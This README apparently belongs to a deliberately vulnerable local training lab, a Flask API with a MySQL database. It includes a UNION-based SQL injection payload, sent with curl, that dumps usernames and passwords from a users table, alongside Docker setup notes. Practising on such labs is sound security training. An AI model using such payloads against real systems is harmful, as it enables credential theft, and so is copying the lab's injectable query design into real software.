# Simple SQL Injection Lab
> Basic Database and API to attempt SQL Injects


## Quickstart
```bash
docker compose up
```
This will launch the API and mySQL Database. Inject attempts can be at http://localhost:5000/products.

### Examples
**Intended usage**

category = `Electronics`
```bash
curl --request GET \
  --url 'http://localhost:5000/products?category=Electronics'
```
Response
```json
[
  {
    "description": "A very cool TV",
    "name": "TV"
  },
  {
    "description": "A very cool Router",
    "name": "Router"
  }
]
```
Collection of items and descriptions

---
**Example SQL Inject**

category = `' UNION SELECT username, password FROM users -- `
```bash
curl --request GET \
  --url 'http://localhost:5000/products?category='\''%20UNION%20SELECT%20username%2C%20password%20FROM%20users%20--%20'
```
Response
```json
[
	{
		"description": "foobar",
		"name": "Bob"
	},
	{
		"description": "barfoo",
		"name": "Alice"
	},
	{
		"description": "foofoo",
		"name": "Eve"
	}
]
```
Collection of usernames and passwords

## Development
> Note: run `docker compose build  --no-cache` after making changes to update in docker

### Updating the Database
Add `.sql` file with SQL DDL and DML to the [database](database) directory. These will be run after the database has 
been created

### Adding New Endpoints
Add endpoints to the [app.py](app/app.py) file. If you import any new python libraries, be sure to run 
```bash
pip freeze > requirements.txt
```
in the app directory to update the dependencies.

### Running the API Locally
The flask app can be run locally, assuming the mySQL database container is running.

#### Full Setup
Starting from [simple-sql-injection](.)
```bash
docker compose up -d mysql-db   # -d runs container in detached mode
cd app
python3 -m venv venv
pip install -r requirements.txt
python3 app.py dev.env  # dev.env can be replaced with another .env file
```

### Accessing the Containers
If you need to access the containers for any reason, you can execute the following commands as needed

**Flask App**
```bash
docker exec -it app /bin/bash
```

**MySQL Container**
```bash
docker exec -it mysql-db /bin/bash
```

**MySQL Database**
```bash
docker exec -it mysql-db mysql database
```